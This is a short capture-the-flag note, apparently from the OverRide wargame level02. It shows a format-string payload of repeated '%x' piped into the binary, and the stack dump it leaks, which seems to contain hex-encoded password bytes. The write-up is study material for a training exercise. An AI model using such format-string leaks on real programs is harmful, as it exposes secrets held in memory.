## level02

level02.c decompilation unchecked

(echo -e 'set disassembly-flavor intel\nset pagination off' ; cat) | gdb level02

```
level02@OverRide:~$ echo -e '%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x\npa
ssword' | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
ffffe4000702a2a2a2a2a2a2a2affffe5f8f7ff9a087373617000000000000003437684861733951574e67586e475873664b394d07825782578257825 does not have access!
```

27 values before repeating 7257825 ('%x' repeating from printf arg)